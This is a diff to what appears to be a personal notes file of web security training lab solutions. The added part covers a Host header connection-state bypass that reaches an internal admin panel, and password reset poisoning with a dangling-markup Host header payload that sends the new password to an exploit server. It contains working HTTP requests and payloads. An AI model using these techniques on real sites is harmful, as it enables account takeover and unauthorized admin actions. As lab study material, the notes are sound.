@@ -3783,7 +3783,43 @@ LLM -> API: create_email_forwarding_rule('peter')
   - Delete the users
     `GET /admin/delete?csrf=QCT5OmPeAAPnyTKyETt29LszLL7CbPop&username=carlos`
 - **Host validation bypass** via connection state attack
+  - create tab group > **Send group in sequence (single connection)**
+    ```
+    request 1
+    GET /admin HTTP/1.1
+    Host: 0a15002a036e927381a9216b002000be.h1-web-security-academy.net
+
+    request 2
+    GET /admin HTTP/1.1
+    Host: 192.168.0.1
+    ```
+  - 2nd request(localhost) successfully response
+    <form style='margin-top: 1em' class='login-form' action='/admin/delete' method='POST'>
+    <input required type="hidden" name="csrf" value="iNOVRGYCFXo0roH93uAD3lk2xuyvZrVB">
+  - on the 2nd tab to submit the form
+    ```
+    POST /admin/delete HTTP/1.1
+    Host: 192.168.0.1
+    Cookie: _lab=YOUR-LAB-COOKIE; session=YOUR-SESSION-COOKIE
+    Content-Type: x-www-form-urlencoded
+    Content-Length: CORRECT
+
+    csrf=YOUR-CSRF-TOKEN&username=carlos
+    ```
 - **Password reset poisoning via dangling markup (Expert)**
+  - Perform forgot password
+    Email Body
+    ```   
+    Please click here to login with your new password: 7x2bwOs1lY
+    View raw: 
+    <p>Hello!</p><p>Please <a href='https://0ac200060401dc0685ffa52900ed00d5.web-security-academy.net/login'>click here</a> to login with your new password: 7x2bwOs1lY</p><p>
+    ```
+  - Tampering the domain name in the host header with arbitrary port number still trigger a password reset email  
+    `<a href='https://0ac200060401dc0685ffa52900ed00d5.web-security-academy.net:8001/login'>`
+  - Inject a dangling-markup payload pointing to your exploit server  
+    `Host: YOUR-LAB-ID.web-security-academy.net:'<a href="//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/?`  
+  - Access log, look for `GET /?/login'>`  
+    "GET /?/login'>click+here</a>+to+login+with+your+new+password:+GgfkWVd8so</p><p>Thanks,<br/>Support+team</p><i>This+emai
 
 ## OAuth Authentication
 Content for OAuth Authentication...
